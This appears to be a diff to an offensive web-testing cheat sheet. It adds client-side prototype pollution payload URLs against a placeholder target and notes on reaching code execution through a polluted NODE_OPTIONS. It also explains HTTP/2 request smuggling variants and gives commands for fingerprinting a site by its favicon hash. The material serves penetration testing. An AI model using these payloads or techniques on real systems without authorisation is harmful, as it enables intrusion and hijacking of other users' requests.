+If errors that used to be 500 now come back as 510, the prototype is polluted (run on Express 4.22). The pollution is global and stays until the process restarts, so probe with harmless names and never with `toString` or `constructor`.
+
+From there: flip a flag that code reads from a plain object, or reach a gadget. On Node 20 and 22 a polluted `NODE_OPTIONS` gives code execution as soon as the app starts a Node child process. Payloads, the tested gadget table and the white-box grep are in [[Prototype Pollution]].
+
+Client-side it is a DOM XSS primitive:
+
+```
+https://victim.example/?__proto__[polluted]=1
+https://victim.example/#__proto__[polluted]=1
+https://victim.example/?constructor[prototype][polluted]=1
+```
+
+Then `Object.prototype.polluted` in the console. You still need a script on the page that reads an unset option into a sink; DOM Invader finds those.
 
 ---
 
@@ -1512,7 +1979,12 @@ SMUGGLED
 
 TE.CL: swap the headers, smuggle inside the chunk.
 
-HTTP/2: a single request with both an HTTP/2 length and a `Transfer-Encoding: chunked` body after downgrade. Burp's HTTP Request Smuggler does the probing; read the report it generates instead of guessing.
+HTTP/2 front end that downgrades to HTTP/1 for the backend. HTTP/2 has its own length, so any length header you add is a lie the backend may believe:
+
+- **H2.CL:** you add a `content-length` that is shorter than the body. The backend stops there and treats the rest as the next request.
+- **H2.TE:** you add `transfer-encoding: chunked`. The backend ends the request at the `0` chunk.
+
+Burp's HTTP Request Smuggler does the probing; read the report it generates instead of guessing.
 
 Confirm by poisoning the *next* client (you, in Repeater): smuggle a complete `GET /404 HTTP/1.1` and see if your follow-up request gets the 404.
 
@@ -1673,7 +2145,8 @@ nuclei -u https://victim.example -tags tech,tech-detect
 Favicon hash (Shodan `http.favicon.hash:`):
 
 ```bash
-curl -s https://victim.example/favicon.ico | md5sum
+curl -s -o favicon.ico https://victim.example/favicon.ico
+md5sum favicon.ico
 # mmh3 hash is what Shodan uses — python3:
 python3 -c 'import mmh3,codecs,sys; d=sys.stdin.buffer.read(); print(mmh3.hash(codecs.encode(d,"base64")))' < favicon.ico
 ```
